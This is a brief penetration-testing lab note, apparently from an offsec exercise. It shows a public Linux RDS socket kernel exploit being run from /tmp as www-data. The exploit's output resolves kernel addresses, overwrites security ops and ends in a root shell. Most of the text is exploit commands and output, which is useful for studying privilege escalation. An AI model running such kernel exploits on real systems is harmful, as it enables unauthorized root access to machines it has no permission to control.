# 7 privesc\_1 rds

```
Using https://github.com/lucyoa/kernel-exploits/tree/master/rds
# 32 bit

www-data@offsecsrv:/tmp/k$ chmod +x rds
www-data@offsecsrv:/tmp/k$ ./rds
[*] Linux kernel >= 2.6.30 RDS socket exploit
[*] by Dan Rosenberg
[*] Resolving kernel addresses...
 [+] Resolved security_ops to 0xc08c8c2c
 [+] Resolved default_security_ops to 0xc0773300
 [+] Resolved cap_ptrace_traceme to 0xc02f3dc0
 [+] Resolved commit_creds to 0xc016dcc0
 [+] Resolved prepare_kernel_cred to 0xc016e000
[*] Overwriting security ops...
[*] Overwriting function pointer...
[*] Triggering payload...
[*] Restoring function pointer...
[*] Got root!
# whoami;id;hostname
root
uid=0(root) gid=0(root)
offsecsrv
```
